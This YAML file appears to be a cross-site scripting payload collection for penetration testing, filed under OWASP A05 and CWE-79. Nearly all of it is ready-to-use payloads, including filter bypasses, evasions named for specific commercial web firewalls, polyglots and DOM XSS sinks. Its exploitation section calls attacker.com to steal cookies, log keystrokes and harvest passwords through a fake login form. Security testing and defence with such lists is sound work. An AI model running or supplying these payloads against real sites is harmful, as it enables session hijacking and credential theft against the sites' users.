# A05:2025 - Injection - Cross-Site Scripting (XSS) Payloads
# CWE-79: Improper Neutralization of Input During Web Page Generation

payload_category: "xss"
owasp_2025: "A05"
cwe: "CWE-79"
severity: "HIGH"

basic_payloads:
  - "<script>alert('XSS')</script>"
  - "<script>alert(document.cookie)</script>"
  - "<script>alert(document.domain)</script>"
  - "<img src=x onerror=alert('XSS')>"
  - "<svg onload=alert('XSS')>"
  - "<body onload=alert('XSS')>"
  - "<input autofocus onfocus=alert('XSS')>"
  - "<select onfocus=alert('XSS') autofocus>"
  - "<textarea autofocus onfocus=alert('XSS')>"
  - "<marquee onstart=alert('XSS')>"

event_handlers:
  onclick: "<div onclick=alert('XSS')>Click me</div>"
  onerror: "<img src=x onerror=alert('XSS')>"
  onload: "<img src=x onload=alert('XSS')>"
  onmouseover: "<div onmouseover=alert('XSS')>Hover</div>"
  onfocus: "<input onfocus=alert('XSS') autofocus>"
  onblur: "<input onblur=alert('XSS') autofocus><input autofocus>"
  onchange: "<select onchange=alert('XSS')><option>1</option></select>"
  onsubmit: "<form onsubmit=alert('XSS')><input type=submit></form>"
  oninput: "<input oninput=alert('XSS')>"
  onanimationstart: "<style>@keyframes x{}</style><div style='animation-name:x' onanimationstart=alert('XSS')>"

filter_bypass:
  no_script_tag:
    - "<img src=x onerror=alert('XSS')>"
    - "<svg/onload=alert('XSS')>"
    - "<iframe src=javascript:alert('XSS')>"
    - "<embed src=javascript:alert('XSS')>"
  
  no_parentheses:
    - "<script>alert`XSS`</script>"
    - "<script>eval.call`${'alert\\x28document.domain\\x29'}`</script>"
    - "<script>onerror=alert;throw'XSS'</script>"
  
  no_quotes:
    - "<script>alert(String.fromCharCode(88,83,83))</script>"
    - "<img src=x onerror=alert(document.domain)>"
    - "<svg><script>alert&#40;1&#41;</script></svg>"
  
  encoded:
    html_entities: "&lt;script&gt;alert('XSS')&lt;/script&gt;"
    url_encoded: "%3Cscript%3Ealert('XSS')%3C/script%3E"
    hex: "<img src=x onerror=\\x61\\x6C\\x65\\x72\\x74('XSS')>"
    unicode: "<script>\\u0061\\u006C\\u0065\\u0072\\u0074('XSS')</script>"
  
  case_variation:
    - "<ScRiPt>alert('XSS')</sCrIpT>"
    - "<iMg sRc=x oNeRrOr=alert('XSS')>"
  
  tag_breaking:
    - "\"><script>alert('XSS')</script>"
    - "'><script>alert('XSS')</script>"
    - "</script><script>alert('XSS')</script>"
    - "<script><!--</script><script>alert('XSS')//--></script>"

waf_bypass:
  cloudflare:
    - "<svg/onload=alert(1)>"
    - "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>" # base64
    - "<iframe srcdoc='<script>alert(1)</script>'>"
  
  imperva:
    - "<img src=x id='x' onerror='alert(1)'>"
    - "<svg><animate onbegin=alert(1) attributeName=x dur=1s>"
  
  akamai:
    - "<object data=javascript:alert(1)>"
    - "<embed src=javascript:alert(1)>"
  
  generic:
    - "<<script>alert('XSS')<</script>>"
    - "<script>/**/alert('XSS')</script>"
    - "<scr<script>ipt>alert('XSS')</scr</script>ipt>"

dom_xss:
  location_hash:
    - "http://example.com/#<script>alert('XSS')</script>"
    - "http://example.com/#<img src=x onerror=alert('XSS')>"
  
  document_write:
    vulnerable_code: "document.write(location.hash.substring(1))"
    payload: "#<script>alert('XSS')</script>"
  
  eval:
    vulnerable_code: "eval(location.hash.substring(1))"
    payload: "#alert('XSS')"
  
  innerhtml:
    vulnerable_code: "div.innerHTML = location.hash.substring(1)"
    payload: "#<img src=x onerror=alert('XSS')>"

polyglot_payloads:
  - "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>"
  - "'\"--></script><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//"
  - 'javascript:"/*''`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>"'

stored_xss:
  - "Comment field: <script>alert('Stored XSS')</script>"
  - "Username: <img src=x onerror=alert('XSS')>"
  - "Bio: <svg onload=alert(document.cookie)>"
  - "Profile picture URL: javascript:alert('XSS')"

reflected_xss:
  - "GET /search?q=<script>alert('XSS')</script>"
  - "GET /error?msg=<img src=x onerror=alert('XSS')>"
  - "GET /redirect?url=javascript:alert('XSS')"

context_specific:
  html_context:
    - "<script>alert('XSS')</script>"
    - "<img src=x onerror=alert('XSS')>"
  
  attribute_context:
    - "\" onmouseover=\"alert('XSS')"
    - "' onclick='alert(\"XSS\")"
    - "javascript:alert('XSS')"
  
  javascript_context:
    - "';alert('XSS');//"
    - "\";alert('XSS');//"
    - "</script><script>alert('XSS')</script>"
  
  css_context:
    - "}</style><script>alert('XSS')</script>"
    - "expression(alert('XSS'))" # IE only
    - "url('javascript:alert(\"XSS\")')"
  
  url_context:
    - "javascript:alert('XSS')"
    - "data:text/html,<script>alert('XSS')</script>"
    - "vbscript:msgbox(\"XSS\")" # IE only

exploitation:
  cookie_theft:
    - "<script>fetch('https://attacker.com/?c='+document.cookie)</script>"
    - "<script>new Image().src='https://attacker.com/steal?c='+document.cookie</script>"
  
  keylogger:
    - "<script>document.onkeypress=function(e){fetch('https://attacker.com/log?k='+e.key)}</script>"
  
  phishing:
    - "<script>document.body.innerHTML='<h1>Session Expired</h1><form action=https://attacker.com/phish><input name=user><input type=password name=pass><input type=submit></form>'</script>"
  
  redirection:
    - "<script>window.location='https://attacker.com'</script>"
    - "<meta http-equiv='refresh' content='0;url=https://attacker.com'>"

prevention:
  - "Output encoding for HTML context"
  - "Attribute encoding for attribute context"
  - "JavaScript encoding for JS context"
  - "URL encoding for URL context"
  - "Content Security Policy (CSP)"
  - "HttpOnly flag on cookies"
  - "X-XSS-Protection header"
  - "Input validation and sanitization"
  - "Use templating engines with auto-escaping"

csp_bypass:
  - "Use JSONP endpoints for callback"
  - "Abuse allowed inline scripts"
  - "Exploit CDN whitelist"
  - "Use 'unsafe-eval' if present"

references:
  - "OWASP Top 10:2025 A05"
  - "CWE-79: Cross-site Scripting"
  - "OWASP XSS Prevention Cheat Sheet"
  - "PayloadsAllTheThings: XSS Injection"
  - "PortSwigger XSS Cheat Sheet"
